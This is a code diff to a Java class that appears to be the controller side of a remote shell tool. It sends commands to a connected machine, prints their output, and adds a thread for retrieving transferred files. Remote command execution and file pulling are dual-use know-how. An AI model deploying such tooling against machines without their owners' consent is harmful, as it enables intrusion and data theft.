@@ -45,7 +45,7 @@ public class ConnectedClient
         try
         {
             String username = getStringFromClient();
-            String ipAddress = connection.getInetAddress().toString().replace("/", ""); // for nice console output
+            String ipAddress = getStringFromClient(); // for nice terminal output
             String inputCommand;
             String workingDirectory = getStringFromClient();
             System.out.print(username + "@" + ipAddress + " ~ " + workingDirectory + " " + TERMINAL_PROMPT + " ");
@@ -54,13 +54,22 @@ public class ConnectedClient
             while(!(inputCommand = input.nextLine()).equals(REMOTE_SHELL_TERMINATE))
             {
                 sendCommandPart(inputCommand); // protocol
-                workingDirectory = getStringFromClient();
-                String result = getStringFromClient();
-                if(result.equals(REMOTE_SHELL_INDICATE_STDERR)) // get extra info if the command produced an output
-                    System.out.print("[!] " + getStringFromClient());
-                else if(result.equals(REMOTE_SHELL_INDICATE_STDOUT))
-                    System.out.print(getStringFromClient());
-                // otherwise server send REMOTE_SHELL_INDICATE_END meaning the command worked as expected so we continue
+
+                if(inputCommand.startsWith(REMOTE_SHELL_TRANSFER))
+                {
+                    new Thread(new Retriever(connection, 1)).start();
+                    //System.out.println(getStringFromClient());
+                }
+                else
+                {
+                    workingDirectory = getStringFromClient();
+                    String result = getStringFromClient();
+                    if(result.equals(REMOTE_SHELL_INDICATE_STDERR)) // get extra info if the command produced an output
+                        System.out.print("[!] " + getStringFromClient());
+                    else if(result.equals(REMOTE_SHELL_INDICATE_STDOUT))
+                        System.out.print(getStringFromClient());
+                    // otherwise server send REMOTE_SHELL_INDICATE_END meaning the command worked as expected so we continue
+                }
 
                 System.out.print(username + "@" + ipAddress + " ~ " + workingDirectory + " " + TERMINAL_PROMPT + " ");
             }
